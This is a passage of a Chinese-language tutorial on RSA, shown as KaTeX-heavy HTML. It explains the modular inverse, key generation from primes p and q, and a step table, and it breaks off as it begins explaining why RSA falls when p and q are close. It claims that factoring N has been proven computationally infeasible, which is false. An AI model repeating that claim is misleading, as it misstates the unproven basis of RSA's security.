xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>满足上述关系，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>被<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>整除，我们称这样的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>为<strong>模反元素</strong>。</p><p>  所以，我们只要保证公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span>和求得的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>互质，那么私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>的存在性是不言而喻的。那么现在问题的关键就是：如何确定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span>的值。</p><p>  我们任意选取足够大的两个质数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，这是我们产生<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>的来源。我们令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mi>p</mi><mo>⋅</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">N=p\cdot q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.63889em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，这样的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>通常是非常大的，理论上计算<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>需要对其进行质因数分解，然而对不知道<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>的人来说，这几乎是不可能的事情，因为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>的质因数分解被证明是<strong>计算上不可行的</strong>了。但作为密钥的分发方，我们却很容易解出，因为我们选取的是两个质数，利用欧拉函数的性质，我们很容易知道</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo>⋅</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mo>⋅</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">\varphi(N)=\varphi(p\cdot q)=\varphi(p)\cdot\varphi(q)=(p-1)(q-1).</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p><p>有了这个解，我们只需要任意取一个和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>互质的数就行了。由此，我们将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>作为公钥发送出去，待我们计算出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>后，保留<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(d,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>作为私钥即可。销毁<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>，这样这组公钥私钥几乎是无法被破解的了。</p><h2 id="加密流程总结"><a class="markdownIt-Anchor" href="#加密流程总结"></a> 加密流程总结</h2><p>  至此，我们已经知道了加密基于的数学原理和方法，这里我们来一些总结。</p><hr /><table><thead><tr><th style="text-align:center">步骤</th><th style="text-align:center">内容</th><th style="text-align:center">生成</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">选取两个不相等的足够大的质数</td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">计算它们的乘积<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">N=p\times q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span></td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">利用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span>的因数计算其欧拉函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>×</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)=(p-1)\times(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">选取任一与<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span>互质的整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span></td><td style="text-align:center">公钥成员<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi></mrow><annotation encoding="application/x-tex">e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span></span></span></span></td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">计算模反元素<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mtext> mod </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed\ \textrm{mod}\ \varphi(N)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord text"><span class="mord textrm">mod</span></span><span class="mspace"> </span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></td><td style="text-align:center">私钥成员<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span></td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">公布公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center">公钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(e,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">保存私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(d,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></td><td style="text-align:center">私钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(d,N)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">销毁<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></td><td style="text-align:center">无</td></tr></tbody></table><hr /><p>  这就是RSA加密算法的原理和流程。</p><h2 id="关于关键的p和q"><a class="markdownIt-Anchor" href="#关于关键的p和q"></a> 关于关键的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></h2><p>  我们知道，如果两个数很接近，那么<strong>它们的差值一定很小</strong>。如果我们选取的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>相差不大，那么RSA在这种情况下是<strong>很容易被攻破的</strong>。我们可以假设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo>&gt;</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">p&gt;q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>并且</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>p</mi><mo>=</mo><mi>a</mi><mo>+</mo><mi>b</mi><mo separator="true">,</mo><mspace width="1em"/><mi>q</mi><mo>=</mo><mi>a</mi><mo>−</mo><mi>b</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">p=a+b,\quad q=a-b,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span 